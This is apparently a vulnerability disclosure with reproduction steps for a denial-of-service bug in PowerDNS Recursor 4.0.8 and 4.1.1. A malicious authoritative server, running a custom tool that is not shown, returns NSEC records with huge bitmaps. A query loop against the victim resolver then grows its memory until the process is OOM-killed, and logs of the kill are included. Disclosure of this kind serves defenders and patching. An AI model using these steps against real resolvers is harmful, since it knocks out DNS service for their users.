# PowerDNS Recursor 4.0.8 and 4.1.1 are killed by OOM, when responses with huge NSEC bitmap is received.

## Overview

PowerDNS Recursor 4.0.8 and 4.1.1 limit the count of RR cache entries,
but they does not limit RR cache size.
Also, crafted NSEC records that include huge bitmap field consume much memory.
Therefor memory usage of pdns_recursor increases by crafted response, finally
pdns_recursor is killed by OOM.


##  Environment

same as cve-2017-15120 report.

### IP Addresses of each servers.

* root DNS server:                192.168.33.100/24
* malicious aurhoritative server: 192.168.33.101/24
* victim full service resolver:   192.168.33.102/24

### OS, Software of each servers.

#### root DNS server

* OS: CentOS 7.4 x86_64 on VirtualBox VM
* DNS: bind

#### Malicious authoritative server

* OS: CentOS 7.4 x86_64 on VirtualBox VM

#### victim full service resolver

* OS: CentOS 7.4 x86_64 on VirtualBox VM
* Memory: 4GB
* SWAP: no
* DNS: PowerDNS Recursor 4.0.8 / 4.1.1

## Setup steps of Environment

### root servers

Install CentOS 7.4 from install ISO image.

Set IP address VM to 192.168.33.100/24.

Set firewalld.

```
    # firewall-cmd --zone=public --add-service=dns --permanent
    # firewall-cmd --reload
```

Install Bind.

```
    # yum install bind bind-utils
```

Upload and extract test-files.tar.gz

```
    # cd /tmp
    # tar xzf /path/to/test-files.tar.gz
 ```

 Copy named.conf and root zone file.

```
    # cp /tmp/test-files/root.named.conf /etc/named.conf
    # cp /tmp/test-files/root.zone       /var/named/root.zone
    # chmod 644 /var/named/root.zone
```

Start named.

```
    # systemctl start  named
    # systemctl enable named
```

#### Malicious authoritative server

Install CentOS 7.4 from install ISO image.

Set IP address to 192.168.33.101/24.

Set firewalld

```
    # firewall-cmd --zone=public --add-service=dns --permanent
    # firewall-cmd --reload
```

Install Build tools.

```
    # yum install epel-release
    # yum install gcc-c++ boost-devel wget perl yaml-cpp-devel bind-utils

    # wget https://cmake.org/files/v3.10/cmake-3.10.0-Linux-x86_64.sh
    # sh cmake-3.10.0-Linux-x86_64.sh --skip-license --prefix=/usr/local
```

Install openssl 1.0.1 from source file.

```
    # wget https://www.openssl.org/source/openssl-1.1.0g.tar.gz
    # tar xzf openssl-1.1.0g.tar.gz
    # cd openssl-1.1.0g
    # ./config
    # make
    # make install
```

Upload and extract test-tools.tar.gz.

```
    # cd /tmp
    # tar xzf /path/to/test-tools.tar.gz
    # cd test-tools
    # OPENSSL_ROOT_DIR=/usr/local/ssl cmake .
    # make
```

Start DNS service foreground.

```
    # ./bin/huge_nsec_response
```

Login to authoritative server from other terminal, and check response of huge_nsec_response.

```
    $ dig \@127.0.0.1 www.example.com nsec +norec
    
    snip
    
    TYPE65531 TYPE65532 KEYDATA TYPE65534
    
    ;; Query time: 149 msec
    ;; SERVER: 127.0.0.1#53(127.0.0.1)
    ;; WHEN: Tue Jan 23 21:01:21 JST 2018
    ;; MSG SIZE  rcvd: 8783

```

### victim full service resolver

Install CentOS 7.4 from install ISO image.

Set IP address to 192.168.33.102/24.

Set firewalld

```
    # firewall-cmd --zone=public --add-service=dns --permanent
    # firewall-cmd --reload
```

Install Build tools.

```
    # yum install gcc-c++ boost-devel openssl-devel lua-devel wget bzip2 bind-utils
```

Install PowerDNS Recursor 4.1.1.

```
    # wget https://downloads.powerdns.com/releases/pdns-recursor-4.1.1.tar.bz2
    # tar xjf pdns-recursor-4.1.1.tar.bz2
    # cd pdns-recursor-4.1.1
    # ./configure
    # make
    # make install
```

Upload and extract test-files.tar.gz.

```
    # cd /tmp
    # tar xzf /path/to/test-files.tar.gz
```

Copy recursor.conf and hints file.

```
    # cp /tmp/test-files/recursor.conf /usr/local/etc
    # cp /tmp/test-files/root.hints    /usr/local/etc
```

Start pdns_recursor.

```
    # swapoff -a
    # /usr/local/sbin/pdns_recursor
```

Login to authoritative server(192.168.33.101) or other Linux machine from other terminal.
Send queries to pdns_recursor.

```
    $ i=0 ; while sleep 0.1 ; do dig @192.168.33.102 $i.example.com nsec +rec +tcp +short ; i=`expr $i + 1` ; done
```

Wait few minutes and check pdns_recurser process.

```
    # /usr/local/sbin/pdns_recursor
    Jan 24 02:35:47 PowerDNS Recursor 4.1.1 (C) 2001-2017 PowerDNS.COM BV
    Jan 24 02:35:47 Using 64-bits mode. Built using gcc 4.8.5 20150623 (Red Hat 4.8.5-16) on Jan 23 2018 21:31:47 by root@resolver.
    Jan 24 02:35:47 PowerDNS comes with ABSOLUTELY NO WARRANTY. This is free software, and you are welcome to redistribute it according to the terms of the GPL version 2.
    Jan 24 02:35:47 Reading random entropy from '/dev/urandom'
    Jan 24 02:35:47 NOT using IPv6 for outgoing queries - set 'query-local-address6=::' to enable
    Jan 24 02:35:47 Only allowing queries from: 127.0.0.0/8, 10.0.0.0/8, 100.64.0.0/10, 169.254.0.0/16, 192.168.0.0/16, 172.16.0.0/12, ::1/128, fc00::/7, fe80::/10
    Jan 24 02:35:47 PowerDNS Recursor itself will distribute queries over threads
    Jan 24 02:35:47 Inserting rfc 1918 private space zones
    Jan 24 02:35:47 Listening for UDP queries on 0.0.0.0:53
    Jan 24 02:35:47 Enabled TCP data-ready filter for (slight) DoS protection
    Jan 24 02:35:47 Listening for TCP queries on 0.0.0.0:53
    Jan 24 02:35:47 Insufficient number of filedescriptors available for max-mthreads*threads setting! (4096 < 4121), reducing max-mthreads to 2035
    Jan 24 02:35:47 Launching 3 threads
    Jan 24 02:35:47 Done priming cache with root hints
    Jan 24 02:35:47 Enabled 'epoll' multiplexer
    Jan 24 02:35:47 Done priming cache with root hints
    Jan 24 02:35:47 Done priming cache with root hints
    Jan 24 02:35:48 Could not retrieve security status update for '4.1.1' on 'recursor-4.1.1.security-status.secpoll.powerdns.com', RCODE = Server Failure
    Killed

```

See /var/log/messages.

```
    Jan 24 02:43:00 resolver kernel: pdns_recursor invoked oom-killer: gfp_mask=0x280da, order=0, oom_score_adj=0
    Jan 24 02:43:00 resolver kernel: pdns_recursor cpuset=/ mems_allowed=0
    Jan 24 02:43:00 resolver kernel: CPU: 0 PID: 17966 Comm: pdns_recursor Not tainted 3.10.0-693.el7.x86_64 #1
    Jan 24 02:43:00 resolver kernel: Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006
    Jan 24 02:43:00 resolver kernel: ffff8800c1599fa0 00000000a7376734 ffff8800d7d17a70 ffffffff816a3d91
    Jan 24 02:43:00 resolver kernel: ffff8800d7d17b00 ffffffff8169f186 ffff8800d7d17b08 ffffffff812b7c3b
    Jan 24 02:43:00 resolver kernel: 0000000000000001 ffff8800d7d17aa8 ffffffff00000202 fffeefff00000000
```



